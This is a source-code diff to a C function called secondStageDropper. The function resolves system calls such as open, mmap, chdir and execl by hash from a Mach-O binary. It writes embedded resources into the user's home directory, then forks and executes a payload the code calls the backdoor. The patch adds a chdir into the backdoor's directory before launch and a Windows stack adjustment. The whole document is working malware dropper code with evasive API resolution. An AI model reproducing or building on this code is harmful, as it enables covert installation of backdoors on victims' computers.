@@ -500,6 +500,8 @@ void secondStageDropper ()
   }
 
   _esp += 0x1c4 + 0x28; // restoring esp
+  _esp -= 0x40;         // Magic Number for 2010 windows only
+
 #else
   unsigned int	eax;
   unsigned int	ecx;
@@ -558,6 +560,7 @@ void secondStageDropper ()
   unsigned int openHash     = 0x98b7a5e9; // _open
   unsigned int lseekHash    = 0xfae127c5; // _lseek
   unsigned int closeHash    = 0x56dcb9f9; // _close
+  unsigned int chdirHash    = 0x974cca09; // _chdir
   unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
   unsigned int statHash     = 0x54c725f3; // _stat
   unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
@@ -587,6 +590,7 @@ void secondStageDropper ()
   int   (*iopen)     (const char *, int, ...);
   long  (*ilseek)    (int, _mOff_t, int);
   int   (*iclose)    (int);
+  int   (*ichdir)    (const char *);
   int   (*ipwrite)   (int, const void *, int, _mOff_t);
   int  *(*istat)     (const char *, struct stat *);
   void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
@@ -645,6 +649,7 @@ void secondStageDropper ()
                       iopen     = (int  (__cdecl *)(const char *, int, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, openHash) + (unsigned int)m_header);
                       ilseek    = (long (__cdecl *)(int, _mOff_t, int))(findSymbolInFatBinary ((byte *)libSystemAddress, lseekHash) + (unsigned int)m_header);
                       iclose    = (int  (__cdecl *)(int))(findSymbolInFatBinary ((byte *)libSystemAddress, closeHash) + (unsigned int)m_header);
+                      ichdir    = (int  (__cdecl *)(const char *))(findSymbolInFatBinary ((byte *)libSystemAddress, chdirHash) + (unsigned int)m_header);
                       ipwrite   = (int  (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
                       istat     = (int* (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
                       immap     = (void*(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
@@ -688,7 +693,8 @@ void secondStageDropper ()
             doExit ();
           
           backdoorPath = (char *) imalloc (256);
-          
+          char *backdoorDir = NULL;
+
           //
           // Cycle through and drop all the resources
           //
@@ -700,6 +706,13 @@ void secondStageDropper ()
               resource = (resourceHeader *)offset;
               
               isprintf (destinationDir, strings[1], userHome, resource->path);
+
+              if (backdoorDir == NULL)
+                {
+                  backdoorDir = (char *)imalloc (256);
+                  isprintf (backdoorDir, strings[1], userHome, resource->path);
+                }
+
               imkdir (destinationDir, 0755);
               
               isprintf (destinationPath, strings[1], destinationDir, resource->name);
@@ -743,7 +756,10 @@ void secondStageDropper ()
           //
           if ((pid = ifork()) == 0)
             {
-              iexecl (backdoorPath, strings[3], NULL, NULL, NULL);
+              ichdir (backdoorDir);
+              //iexecl (backdoorPath, strings[3], NULL, NULL, NULL);
+              iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
+              ifree (backdoorDir);
             }
           else if (pid > 0)
             {
